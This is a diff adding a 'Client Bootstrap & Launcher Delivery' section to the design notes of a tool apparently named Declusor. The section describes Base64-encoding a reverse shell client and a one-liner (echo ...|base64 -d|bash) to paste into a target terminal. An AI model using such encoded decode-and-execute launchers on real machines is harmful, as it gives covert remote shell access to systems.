@@ -52,6 +52,18 @@ When execution finishes, the client prints the ephemeral envelope delimiter:
 
 The server monitors the incoming stream, immediately yielding output chunks to the session while maintaining an internal buffer to detect the delimiter prefix. Upon finding `b"__DECLUSOR_EOF_" + nonce + b"__"`, the stream terminates cleanly.
 
+## Client Bootstrap & Launcher Delivery
+
+The `shell_socket` client bootstrap script is prepared through a 3-step pipeline:
+
+1. **Template Interpolation**: Injects server host, port, and acknowledgment token into `shell_socket_client.sh`.
+2. **Base64 Payload Encoding**: Encodes the rendered script into Base64 ASCII bytes, removing newline and quote escaping friction across different shell environments.
+3. **Self-Contained Subshell Wrapper**: Delivers the launcher in a `LauncherDelivery` envelope configured with `ShellSocketRuntime.DEFAULT_WRAPPER_TEMPLATE`:
+   ```bash
+   (echo '$DECLUSOR_SCRIPT'|base64 -d|bash)
+   ```
+   Pasting this command into any target terminal decodes and executes the reverse shell client inside an isolated subshell.
+
 ## Session Lifecycle & State Machine
 
 ### Sequence Diagram
